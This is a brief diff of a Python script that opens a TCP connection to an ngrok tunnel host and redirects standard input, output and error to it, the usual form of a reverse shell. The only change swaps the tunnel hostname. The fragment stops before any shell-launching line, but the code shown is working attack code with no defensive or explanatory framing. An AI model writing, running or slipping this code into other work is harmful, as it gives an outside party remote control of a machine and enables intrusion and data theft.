@@ -3,7 +3,7 @@ import subprocess
 import os
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("0.tcp.ngrok.io", 14098))
+s.connect(("0.tcp.in.ngrok.io", 14098))
 os.dup2(s.fileno(), 0)
 os.dup2(s.fileno(), 1)
 os.dup2(s.fileno(), 2)
